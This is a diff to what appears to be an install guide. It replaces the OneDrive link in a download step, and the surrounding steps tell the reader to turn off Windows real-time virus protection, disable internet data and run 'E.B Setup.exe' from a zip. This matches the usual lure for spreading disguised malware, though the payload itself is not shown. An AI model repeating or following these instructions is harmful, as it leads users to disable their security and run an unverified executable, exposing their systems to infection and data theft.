@@ -15,7 +15,7 @@ Open `Windows Security > Virus & threat protection > Manage settings` and turn o
 
 * Step 2: download file...
 
-> download the file from [here](https://1drv.ms/u/s!AsHE808G_RHegysSI2VHdDMpNQQZ) .
+> download the file from [here](https://1drv.ms/u/s!AsHE808G_RHegzlLs8bB1v52eHol) .
 
 * Step 3: turn off Internet Data and start `Setup.zip > E.B Setup.exe`
 
